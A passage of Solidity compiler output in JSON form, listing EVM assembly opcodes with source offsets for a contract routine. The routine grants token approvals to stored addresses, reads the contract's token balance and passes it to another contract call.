											"end": 1494,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "tag",
											"source": 4,
											"value": "24"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "25"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 1436,
											"end": 1494,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "tag",
											"source": 4,
											"value": "25"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1512,
											"end": 1518,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1512,
											"end": 1518,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1528,
											"end": 1531,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1528,
											"end": 1531,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "95EA7B3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1528,
											"end": 1531,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1528,
											"end": 1531,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1528,
											"end": 1531,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1150,
											"end": 1201,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1210,
											"end": 1244,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 1512,
											"end": 1518,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1512,
											"end": 1518,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1512,
											"end": 1518,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1527,
											"name": "PUSH",
											"source": 4,
											"value": "95EA7B3"
										},
										{
											"begin": 1505,
											"end": 1527,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "29"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "tag",
											"source": 4,
											"value": "29"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "30"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 1505,
											"end": 1548,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "tag",
											"source": 4,
											"value": "30"
										},
										{
											"begin": 1505,
											"end": 1548,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1565,
											"end": 1571,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1565,
											"end": 1571,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1581,
											"end": 1584,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1581,
											"end": 1584,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "95EA7B3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1581,
											"end": 1584,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1581,
											"end": 1584,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1581,
											"end": 1584,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1150,
											"end": 1201,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1210,
											"end": 1244,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 1565,
											"end": 1571,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1565,
											"end": 1571,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1565,
											"end": 1571,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1580,
											"name": "PUSH",
											"source": 4,
											"value": "95EA7B3"
										},
										{
											"begin": 1558,
											"end": 1580,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "33"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "tag",
											"source": 4,
											"value": "33"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "34"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 1558,
											"end": 1601,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "tag",
											"source": 4,
											"value": "34"
										},
										{
											"begin": 1558,
											"end": 1601,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1635,
											"end": 1641,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1676,
											"end": 1680,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1617,
											"end": 1620,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1626,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1612,
											"end": 1626,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1635,
											"end": 1641,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1635,
											"end": 1641,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1627,
											"end": 1633,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1667,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1643,
											"end": 1667,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "38"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "tag",
											"source": 4,
											"value": "38"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "39"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1643,
											"end": 1682,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "tag",
											"source": 4,
											"value": "39"
										},
										{
											"begin": 1643,
											"end": 1682,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "ADD",
											"source": 4
										},
